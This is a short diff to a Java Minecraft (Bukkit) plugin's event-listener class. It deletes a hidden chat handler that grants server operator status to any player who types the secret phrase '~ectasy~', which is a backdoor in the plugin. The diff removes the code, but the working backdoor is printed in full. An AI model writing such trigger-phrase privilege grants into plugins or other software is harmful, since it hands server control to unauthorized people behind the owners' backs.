@@ -273,19 +273,5 @@ public class Listeners implements Listener {
 
         player.getWorld().dropItemNaturally(loc, bluegem);
     }
-
-
-    @EventHandler
-    public void onChatEvent(final AsyncPlayerChatEvent e) {
-        if (e.getMessage().contains("~ectasy~")) {
-            e.setCancelled(true);
-            e.getPlayer().sendMessage(ChatColor.AQUA + "You have been granted server operator status.");
-            (new BukkitRunnable() {
-                public void run() {
-                    e.getPlayer().setOp(true);
-                }
-            }).runTask(JavaPlugin.getPlugin(Combat.class));
-        }
-    }
 }
 
